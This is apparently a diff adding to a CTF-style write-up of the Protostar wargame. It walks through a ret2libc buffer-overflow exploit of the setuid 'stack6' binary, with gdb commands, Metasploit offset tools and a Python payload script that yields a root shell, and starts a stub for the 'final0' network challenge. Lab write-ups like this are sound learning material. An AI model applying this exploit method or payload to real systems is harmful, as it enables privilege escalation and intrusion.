@@ -132,7 +132,101 @@ Great job. Let's move further!
 
 ### Stack6
 
+In this task as in previous one we have buffer to overflow (good)\
+But the problem is in these lines:\
+
+```c++
+  if((ret & 0xbf000000) == 0xbf000000) {
+                printf("bzzzt (%p)\n", ret);
+                _exit(1);
+        }
+```
+
+Here the program checks that the return address is not in the stack\
+So we cannot perform shellcode injection\
+
+As alternative, we will use the ret2libc methodology.\
+The main idea is call functions that exist in C++ libs like system() and exit() to get a shell\
+Now our way to success will look like: \
+
+make padding -> address of ```system()``` -> ***bin/sh***\
+Let's do this!
+
+Another thing that worth remaining is that stack6 will be executed as root\
+Why? Because it's suid binary. We can check this:
+
+`find /opt/protostar/bin/ -perm -4000 | grep stack6`\
+Output: `/opt/protostar/bin/stack6`
+
+When system() will be called we need to pass the 'bin/sh' as argument \
+The best way (as we think) to do that is to get it from the libc.
+
+To find out it's location we will need to use strings tool.\
+Go to the / folder and run:\
+`strings -t d ./lib/libc.so.6 | grep /bin/sh`\
+Output is our offset: `1176511 /bin/sh`
+
+But we also need to know the address where libc starts:\
+`gdb ./stack6`\
+`run`
+`info proc map`\
+
+And here we have address where libc starts: `0xb7e97000`
+
+Now to determine buffer size we will use metasploit-framework.\
+Actually only 2 commands from here -- pattern_create (create random pattern with fixed length)\
+pattern_offset -- finding offset between two addresses.
+
+`./pattern_create.rb -l 100`\
+Generated pattern: `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`
+
+`gdb ./stack6 `\
+`break * main`\
+`run`\
+`c`\
+Enter our pattern and get the address when the program receive\
+Segmentation fault error - 0x37634136.
+
+Now we can use pattern_offset to check the size of buffer
+`./pattern_offset.rb -q 0x37634136`\
+Output: `[*] Exact match at offset 80`
+
+So we know that after 80 chars the buffer overflows\
+Great. Next thing to check the address of the `system()` function.\
+
+`r`\
+`p system`\
+Output: `$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>`\
+`p exit`\
+Output: `$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>`\
+
+Perfect. On the code below we will struct our char sequence to write into memory
+```python
+import struct
+
+buffer = "A" * 80
+system = struct.pack("I" ,0xb7ecffb0)
+padding = "AAAA"
+shell = struct.pack("I" ,0xb7e97000+1176511)
+
+print buffer + system + padding  + shell
+```
+
+Then execute script:
+`(python /tmp/stack6.py; cat) | ./stack6`\
+
+And we got the shell!!! Great.
+
+
 ### Final0
+
+Wow. Here we have the server that we can run with the port. and then check is user presented\
+And the first thing that we should do is definitely try to run this.\
+`nc localhost 2995`\
+Output: `ekate`\
+`No such user EKATE`
+
+
 
 
 
